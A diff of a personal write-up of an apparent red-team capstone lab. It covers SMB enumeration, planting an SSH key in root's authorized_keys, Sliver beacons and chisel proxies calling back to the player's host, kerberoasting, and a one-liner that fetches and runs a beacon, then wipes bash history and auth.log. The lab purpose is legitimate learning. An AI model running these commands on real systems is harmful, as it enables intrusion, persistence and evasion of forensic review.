@@ -24,6 +24,7 @@ Learnt:
 - Multiple Ways means Multiple bypasses to other users
 - Cyber-Cold-Warfare with the rest of the community
 - RDP inception gets a bit silly - forgetting that you are connecting back on yourself for fifth layer when you already have a session  
+- My inituitive builtin PrivEsc Locally is tacticool is not strategical relevant, beware the unthinking. AD escalation and laterally movement, before Local Privilege Escalation is always a reduction in time to objective.
 
 
 ![](october.png)
@@ -67,12 +68,10 @@ Firstly connecting to have a pretend domain squated email.
 
 ## OSINT  
 
-
-
-Message from Am03baM4n
+A message from Am03baM4n
 ![](messagefromAmoebaman1.png)
 
-Alh4zr3d's initial steps while enumerating in the background begin with `crackmapexec`. This contrasts with literature on Pentration testing that suggest portscanning the reason being that it is a Windows Network and will use common ports. This will the save time on identification while some port scanner maps out or not depending on objective regarding stealth. 
+Alh4zr3d's initial steps while enumerating in the background begin with `crackmapexec`. This contrasts with literature on Pentration testing that suggest port scanning the reason being that it is a Windows Network and will use common ports. This will the save time on identification while some port scanner maps out or not depending on objective regarding stealth. 
 ```
 crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
 ```
@@ -80,7 +79,7 @@ crackmapexec <proto> 10.200.116.0/24 -u '' -p ''
 We also get versioning for Linux with ssh, not just the Windows hostnames and builds, signing compliance and versions of services. Connecting the dot between clusters of network can hint at what overall design of the network has be shape by what is its expected use.
 ![](cme-init.png)
 
-A common step for CTF players is the Web application, but also APTs. Web application misconfigurations or exploits can exploited and then patched behind the attacker. Webshells then offer easy foothold back into the network if VPN key redistribution or signatures on malicious email and pretexts take time to make and utilize. 
+A common step for CTF players is the Web application, but also APTs. Web application misconfigurations or exploits can exploited and then patched behind the attacker. Webshells then offer easy foothold back into the network if VPN key redistribution or signatures on malicious email and pretexts take time to make and utilise. 
 ![](webroot.png)
 - Aimee Walker & Patrick Edwards. Developers with SeDebugPrivilege Rights as Malware Jake says are just SYSTEM (Administrator) they just do not not know it yet. These two individuals did not have pictures helpfully identifying even minor roles on the company. The exposure of minor roles so plainly makes the work to understand the internal relationships of whom communicates with whom very easy. So harvesting usernames from the http://10.200.116.13/october/index.php/demo/meettheteam which links to http://10.200.116.13/october/themes/demo/assets/images/, then all possible include potential employees whom may still have accounts or been misplaced in System Administrator utilizing soft-delete. These account could be revived 
 ```bash
@@ -188,7 +187,7 @@ echo "Second curl ended at: $TIME3"
 exit
 ```
 
-Just as I was catching up on the progress made by [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) at this point he discovers a VPN key. Unlike Alh4zr3d or Tib3rios who went with a target approach - Web server and Email server plus password spray. Tyler went for a similar approach to I originally set out with holistic scanning and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement. 
+Just as I was catching up on the progress made by [Tyler](https://www.youtube.com/watch?v=xrh3g5VjY6Y&t=5277s) at this point he discovers a VPN key. Unlike Alh4zr3d or Tib3rious who went with a target approach - Web server and Email server plus password spray. Tyler went for a similar approach to I originally set out with holistic scanning and enumerate anything and everything and list out threads of where to pull of the next stages of the overall engagement. 
 
 A real APT is probably going to sit down and have targets on packet economy, what fake accounts do OSINT from where and so on and target a way in with an objective like ours, but without actual users, administrators or a SOC, CTI or IR. 
 
@@ -231,16 +230,14 @@ cat /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt && 
 
 There is a VPNs directory to fuzz. If we have a username format we can fuzz it. I forgot to reset the network and then the VPN key.
 
-# EDITTED TO HERE
-
-Alh4zr3d goes full sliver and re-introduces me to the wonder of [ScareCrow](https://github.com/optiv/ScareCrow) 
+Alh4zr3d goes full sliver and re-introduces me to the wonders of [ScareCrow](https://github.com/optiv/ScareCrow) - a *"Payload creation framework designed around EDR bypass"*; the use of ScareCrow is to covert shellcode created by Sliver into Binaries that have fake signatures and harder for EDR to detect as malicious.
 
 - https://github.com/BishopFox/sliver/wiki/Pivots
 - https://dominicbreuker.com/post/learning_sliver_c2_10_sideload/
 
 Tyler references [Orange-Cyberdefense Mindmaps](https://github.com/Orange-Cyberdefense/ocd-mindmaps/blob/main/img/pentest_ad_dark_2023_02.svg), which is a extensive mindmap of AD attacks.
 
-At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others sturggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the corpusername.ovpn as soon as possible. 
+At this point after watching [Alh4zr3d live](https://www.twitch.tv/videos/1823317510) I decided to approach this by preparing to be able to bypass EDR, AV first before continuing with The VPN route. I want to follow both methods and check Tib3rious's way in before getting the second domain controller. As objective go the main problem is that I neither have to time or experience over the coming weeks to dedicate to bypassing EDR for the first time without some tried a true way. I acknowledge the hand-holding to success with dedicating a significant amount of write and research work for my Archive Project to learn as much from others struggles. To save myself time in the future struggle of HTB ProLabs that I will hopeful do next year. Guessing that Tyler will probably gain a foothold I started by considering my options before going through other paths with [Part 2 of Tyler RTCC video](https://www.youtube.com/watch?v=TUyYUSr0O_Y). [am03bam4n](https://tryhackme.com/p/am03bam4n) was present on this stream and explained that the VPN instability is reflective of the real world - what I took from this is that actually we need away from using the `corpusername.ovpn` as soon as possible. 
 
 `fping` is better than `ping`
 ```bash
@@ -261,7 +258,7 @@ nmcli
 Tyler went deep into the web application:
 ![](wehaveuserenum.png)
 
-Password Mangling - instead of the extensive ChatGPT usage I went for search engines - https://github.com/NotSoSecure/password_cracking_rules.git, because although AI is great as a service it is not is commonly wrong, but the tone of authority and some of the syntax used is both irratating and also really dangerous. It is very sure it is correct that it search the internet better that you. Also it is slow and filtering for "safety". And to top it off there are better open source version that I need to look into before all the sad tech companies failing to hit profit try to restrict the entire market and eco-system to save themselves not everyone else. Continuing on with [Part 3 with Tyler](https://www.youtube.com/watch?v=svdhIyifHC8) and [Finishing the AV evasion stream for the knowledge](https://www.twitch.tv/videos/1823317510)...but Al had a rough time and I 
+Password Mangling - instead of the extensive ChatGPT usage I went for search engines - https://github.com/NotSoSecure/password_cracking_rules.git, because although AI is great as a service it is not is commonly wrong, but the tone of authority and some of the syntax used is both irritating and also really dangerous. It is very sure it is correct that it search the internet better that you. Also it is slow and filtering for "safety". And to top it off there are better open source version that I need to look into before all the sad tech companies failing to hit profit try to restrict the entire market and eco-system to save themselves not everyone else. Continuing on with [Part 3 with Tyler](https://www.youtube.com/watch?v=svdhIyifHC8) and [Finishing the AV evasion stream for the knowledge](https://www.twitch.tv/videos/1823317510)...but Al had a rough time and I 
 
 ```bash
 # Download the OneRuleToRuleThemAll
@@ -279,50 +276,53 @@ laura.wood@thereserve.loc : Password1@ for the [[Red-Team-Capstone-Challenge-Cre
 
 [37:54](https://www.youtube.com/watch?v=svdhIyifHC8) - My VPN or the server is already patched behind someone already ahead of me.
 
-Press submit for free VPN keys
+Press submit for free VPN keys.
 ![](laurawoodvpnlogin.png)
 
-WE ARE MOHAMMAD - rdp access finally!!!
+WE ARE MOHAMMAD - RDP access finally!!! I have never wanted or enjoyed have RDP on workstation in the years doing any CTF more than this. Feels weird man..
 ![](wearemohammad.png)
 
-![](wehaveping.png)
+Ping alerts.
+![1080](wehaveping.png)
 Then the machine shutdown.
 
 ## Perimeter Breach
 
-Then al finds cmd injection
+Now understanding that some of the actually tradecraft bar is quiet low, but aspects like EDR, phishing, managing larger scale intrusion and AV evasion are aspects I would like to learn deeply as possible during the RTCC - I returned with the third Alh4zr3d stream, which focused on not phishing a way. I am glad as it is not a simulated as it can possibly be from what I had read about Social Engineering CTFs. Then AL finds `cmd` injection
 ![](alhappywecansleeptheserver.png)
 
-My suspicions of the multitude of hole in the bank to poke at are many
+My at-the-times suspicions of the multitude of holes in the bank's network to poke at are many are validated by the creator as I then decide how I could approach and what I wanted to accomplish.
 ![1080](alfindcmdi.png)
 
-Password in DB connect
+Al hammers hole the most important post-initial-compromise footholding of a boot2root to real world webserver - check the configs and DBs for cleartext or ciphertext passwords. There is in fact a clear text Password in DB connect. 
 ![](dbconnect.png)
 
-vpn : password1!
+`vpn : password1!` -
 
+The www-data user has sudo permissions...
 ![](sudolvpnserver.png)
 
+While I catch up on Al going through a DB while enumerate a context given that he was doing that and parasocial teamwork exists if I play my part.
 ![](lisamorepass.png)
 
-lisa.moore : Scientist2006
-
-[gtfobins cp](https://gtfobins.github.io/gtfobins/cp/#sudo)
+`lisa.moore : Scientist2006` - sadly hindsight is that these credentials are rather useless, `lisa.moore` is a as regular a user as they come. We could go full cyber and [gtfobins cp](https://gtfobins.github.io/gtfobins/cp/#sudo)
 ```
 LFILE=file_to_write
 echo "DATA" | sudo cp /dev/stdin "$LFILE"
 ```
 
-Al wants to pivot, but then wants to overwrite ssh. Sshimple is better
+Or just Al wants to pivot, but then wants to overwrite ssh. Sshimple is better..
 ```bash
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/zc3tx/DGZGDr7KWUlAzH5stPT7oySNhZqe+1snxmByRA7kiIIp8tly12x7vxFCvwhf7R7Sp1qR0Pzi5S5uAGO//+YD4ukVDtzA0F0oi2KjWsGZB5I0HUp7QERY8nb9yL3rfTC6HIMF0cCBUU0zNkVnCSYeZDG7WePSp7lblIOBmHd54a+3UAaShQc8Fadk0IQchW8MAvRcyQM7J0F2fT/aPTmUbv77VrUWFapgwuUBydXZA9eu+YOn9y1g5ID3QL6UpVHjNAjXPw1byRiyMRPUZcCL9No5fNa7Lu3e6xqB7qvgT20CQuohkpckWBroFoitG/K0VVsFFwQWaXvZGLwKJtvBwscDVIcFdoqfUO9JNNZ9G0Q97t1CZTuT9vRLvlRyOp1gir/iE45hCzchmpz8SM4RvGo8gvpnKWy8//noDas6nXqRxwvAEKe2S4nbSFBD5Xt7gTOH1gukutcN0TDQ+Iw0tYNXpHnIgKzhx/CseyPd+1KPhbTtq5T44W9yc=" > authorized_keys
 sudo cp authorized_keys /root/.ssh/authorized_keys
 ```
 
+Although this is actually the most disruptive way for other players as everyone using ssh to forward their traffic deeper into the network. 
 ![](cpintoroot.png)
 
-Went on a bit of tangent with how Proxychains works; SSH tunnel - but we are on a multi-hacker network so everyone using ssh is a really danger.
+Went on a bit of tangent with how `Proxychains` works; SSH tunnel - but we are on a multi-hacker network so everyone using ssh is a really danger. I did find the answer to a question from a member of the twitch chat, but the [kernel does handle a TCP stack](https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html) which is then intercepted by `proxychains` a proxifier application. So the reason Masscan can go through proxychains is because Masscan has its own TCP stack not the Kernels TCP stack.
 
+Lived of the pentester's pinic of binaries that was on the VPN box, probably not real life, but I can only guess.
 ```bash
 cat vpn-interal-thm-free-packed-lunch-in-the-lands.nmap | grep 'scan report' | awk '{print $6}' | tr -d '()' > ~/RedTeamCapStoneChallenge/internalHosts.txt
 # Local network information
@@ -330,9 +330,10 @@ route
 arp -a
 ```
 
+The arp cache shows all the connections to all the internal boxes over IPv4, which AD is built around with hostnames and A records of DNS.
 ![](vpnarpcache.png)
 
-Persistence just in case of other people using the same vectors
+With my strategy for these machines knowing how long it took my to go through the AD Red Team Rooms because of other people, good persistence and the path least contested is the best route, so `Chisel` and `Sliver` binaries trumph `ssh` and `tty` shells. This was in part inspired by wanting to learn `sliver` as it is the closest open source C2 to Cobalt Strike, it has better features than Empire - most fimilar due to older course material from OSCP. So Sliver would act as primary persistence just in case of other people using the same vectors and services and do the work with chisel rather than clog as ssh tunnel of service very stuffed with ssh tunnels or use the vpn given.
 ```go
 // For VPN
 generate --mtls 10.50.113.184:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/Tools/VPN-upgrade
@@ -344,7 +345,17 @@ nohup ./VPN-update &
 nohup ./VPN-upgrade &
 ```
 
-Setup up chisel server to handle a Dynamic Reverse Proxy 
+I used ssh to hold root over the box just in needed it, downloaded and ran beacon to watch over the box and a oneliner from the Red Team Field Manual plus I added the `echo "" > authorized_keys` as an improvement here when I would as workflow as www-data with `sudo cp`. I put this here for ease of reading about what i did and possibly a better way to do it, but I presumed that anyone pissed off that I had hurt their ssh connection somehow would check auth.log, which I could have further improved by doing as root in this oneliner, but I was commonly on my toes trying to up pace others who were either probably better and most certainly understood what later steps I did not know.  
+```bash
+ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "10.200.116.12"
+ssh -i vpn_root.rsa root@10.200.116.12
+# In /dev/shm everytime
+curl http://10.50.113.184:8443/VPN/VPN-update -o VPN-update
+nohup ./VPN-update &
+echo "" > /root/.bash_history && echo "" > authorized_keys && echo "" > /var/log/auth.log && kill -9 $$
+```
+
+Setup up chisel server to handle a Dynamic Reverse Proxy.
 ```bash
 ./chisel server -host 10.50.113.184 -p 20000 --reverse --socks5 -v
 # On the VPN
@@ -356,7 +367,7 @@ socks5  127.0.0.1 20001
 Proxychains and chisel proof
 ![](proxychainandchiselsetupcomplete.png)
 
-lisa.moore credentials have been 
+lisa.moore credentials have been ...upsettingly rough 
 ![](passwordchangeon103.png)
 
 Bloodhound run with `--dns-tcp` uses dns over tcp which works better over `proxychains`, but this did not work for Al. 
@@ -370,40 +381,42 @@ generate beacon --mtls 10.50.113.184:11013 -b --arch amd64 --os windows -f shell
 execute-assembley -i 
 ```
 
-Download with `Google Chrome` from RDP session
+Downloaded with `Google Chrome` from RDP session. This made so much sense when Al just did this on stream that seemed so out of left field, but I have not had to pretend to be a regular user before. So a regular user will just browser the net and use a browser to download things they may not actually want. Alh4zr3d disscuss the merits of the C2 framework  call Covenant. Covenant is .Net framework meaning that if we unhook AMSI Windows Defender is bypassed from then on.  And he also discovers that SharpHound.ps1 works, but I think I missed the AMSI bypass due to needing to sleep.
 
-Covenant is .Net framework meaning that if we unhook AMSI Windows Defender is bypassed from then on
+#### The  next day with Tib3rious's stream before Al's stream
 
-SharpHound.ps1 works
-
-Crying out the credential changing, Tiberious struggles till he get `admin : password1!`
+Crying out the credential changing, Tib3rious struggles till he get `admin : password1!`
 ![](tibsisinontheweb.png)
 
-Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef)
+Shakestech recommends [https://github.com/iphelix/dnschef](https://github.com/iphelix/dnschef), which is a full dns stack, that made the [[BeyondRoot-Todo]] list.
 
 ## Initial Compromise of Active Directory
 
-Message from Am03baM4n
+Another message from Am03baM4n
 ![](messagefromAmoebaman2.png)
+
+I then got everything working again and I really, really like bloodhound
 ```bash
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.02 -u 'lisa.moore' -p 'Scientist2006'
 ```
 
-I added 2 screenshosts to [[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
-
+I added 2 screenshots to [[RTCC-BH-Notes-Corp]] - and then kerberoasted the dc
 ```bash
 proxychains4 impacket-GetUserSPNs -dc-ip 10.200.116.02 -request 'corp.thereserve.loc/laura.wood'
 ```
 
+The wall of joy.
 ![](kerberoastagasm.png)
 
 The svcScanning spn is crackable
 
 ![](bigbypass.png)
 
-- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presume that either previous compromises would have left artefacts and 
+- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presumable that either previous compromises would have left artefacts. I later learn that as cool a feature as this is this would probably fire of the entire SOC team into making sustained wee-woo-wee-woo noises before saying got-him to each other while would have had to bury my curiosity and excitement. Thankfully no alerts or EDR or Windows Defender just an empty .dmp file to exfiltrate out just to test what can leave the network.
 
-[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g) , 
+#### Sliver reading and watching 
+
+[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g)  for great breakdown of sliver for red and blue teams.
 ```go
 // Display help
 help <command>
@@ -466,18 +479,27 @@ sharpup audit
 execute -o icacls "c:\Backup Service"
 ```
 
-We have full control of the backup service 
+We have full control of the backup service.
 ![](backupyourpathboyoswearepathhijackrinoingthewrk1.png)
 
+Although I felt pleasantly happy trying to PrivEsc on this box, this is were a team and more experience in larger networks and one of the main insights of my workflow being not the most effective played out.
 ```go
 execute -o sc query state= all
 // COPY and PASTE stop :set paste in vim sometimes...
 xsel -b > WRK1-sc-qc.output 
 ```
 
+This service was not exploitable for me.
 ![](foundthebackupservice.png)
 
-Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator.  Some [seatbelt commmands](https://github.com/GhostPack/Seatbelt)
+Sadly I got 193 error meaning that I could perform the path hijack and the `serviceName` service outputs error 5 meaning I needed administrator on the Box. This was a rabbit hole and enlightening of were my tactic struck against my objective.
+
+AD escalate and laterally move, before box escalation - Local Privilege Escalation takes longer.
+
+#### EDIT FROM HERE
+
+
+Some [seatbelt commmands](https://github.com/GhostPack/Seatbelt)
 ```go
 // 
 seatbelt -h 
